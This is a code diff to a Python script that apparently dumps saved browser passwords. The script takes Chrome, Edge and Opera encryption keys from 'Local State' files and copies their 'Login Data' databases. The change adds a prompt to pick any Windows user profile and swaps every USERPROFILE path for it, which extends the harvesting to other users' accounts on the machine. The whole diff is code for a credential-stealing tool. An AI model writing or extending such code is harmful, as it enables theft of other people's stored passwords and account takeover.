@@ -7,6 +7,18 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 
+while True:
+    profile = input('What profile do you want to use? (Press Enter for Self): ')
+    p_path = f"C:\\Users\\{profile}"
+
+    if os.path.exists(p_path) == True:
+        if profile == '':
+            p_path = os.environ["USERPROFILE"]
+        break
+    elif os.path.exists(p_path) == False:
+        print(f'{p_path} is not valid')
+        print('Names are case sensitive.')
+        continue
 
 def chrome_finder():
     def get_chrome_datetime(chromedate):
@@ -15,7 +27,7 @@ def chrome_finder():
         return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
     def get_encryption_key():
-        local_state_path = os.path.join(os.environ["USERPROFILE"],
+        local_state_path = os.path.join(p_path,
                                         "AppData", "Local", "Google", "Chrome",
                                         "User Data", "Local State")
         with open(local_state_path, "r", encoding="utf-8") as f:
@@ -50,7 +62,7 @@ def chrome_finder():
         # get the AES key
         key = get_encryption_key()
         # local sqlite Chrome database path
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+        db_path = os.path.join(p_path, "AppData", "Local",
                                 "Google", "Chrome", "User Data", "default", "Login Data For Account")
         # copy the file to another location
         # as the database will be locked if chrome is currently running
@@ -98,7 +110,7 @@ def chrome_finder_sub(): # This checks if the google account has any stored pass
         return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
     def get_encryption_key():
-        local_state_path = os.path.join(os.environ["USERPROFILE"],
+        local_state_path = os.path.join(p_path,
                                         "AppData", "Local", "Google", "Chrome",
                                         "User Data", "Local State")
         with open(local_state_path, "r", encoding="utf-8") as f:
@@ -133,7 +145,7 @@ def chrome_finder_sub(): # This checks if the google account has any stored pass
         # get the AES key
         key = get_encryption_key()
         # local sqlite Chrome database path
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+        db_path = os.path.join(p_path, "AppData", "Local",
                                 "Google", "Chrome", "User Data", "default", "Login Data")
         # copy the file to another location
         # as the database will be locked if chrome is currently running
@@ -181,7 +193,7 @@ def edge_finder():
         return datetime(1601, 1, 1) + timedelta(microseconds=edgedate)
 
     def get_encryption_key():
-        local_state_path = os.path.join(os.environ["USERPROFILE"],
+        local_state_path = os.path.join(p_path,
                                         "AppData", "Local", "Microsoft", "Edge",
                                         "User Data", "Local State")
         with open(local_state_path, "r", encoding="utf-8") as f:
@@ -216,7 +228,7 @@ def edge_finder():
         # get the AES key
         key = get_encryption_key()
         # local sqlite edge database path
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+        db_path = os.path.join(p_path, "AppData", "Local",
                                 "Microsoft", "Edge", "User Data", "Default", "Login Data")
         # copy the file to another location
         # as the database will be locked if edge is currently running
@@ -264,7 +276,7 @@ def opera_finder():
         return datetime(1601, 1, 1) + timedelta(microseconds=operadate)
 
     def get_encryption_key():
-        local_state_path = os.path.join(os.environ["USERPROFILE"],
+        local_state_path = os.path.join(p_path,
                                         "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = f.read()
@@ -298,7 +310,7 @@ def opera_finder():
         # get the AES key
         key = get_encryption_key()
         # local sqlite opera database path
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
+        db_path = os.path.join(p_path, "AppData", "Roaming",
                                 "Opera Software", "Opera Stable", "Login Data")
         # copy the file to another location
         # as the database will be locked if opera is currently running
@@ -390,10 +402,6 @@ elif browser_choise.lower() == 'opera':
         print('Opera is not installed')
         input('\nPress Enter to Exit...')
         quit()
-
-
-
-
 
 
 
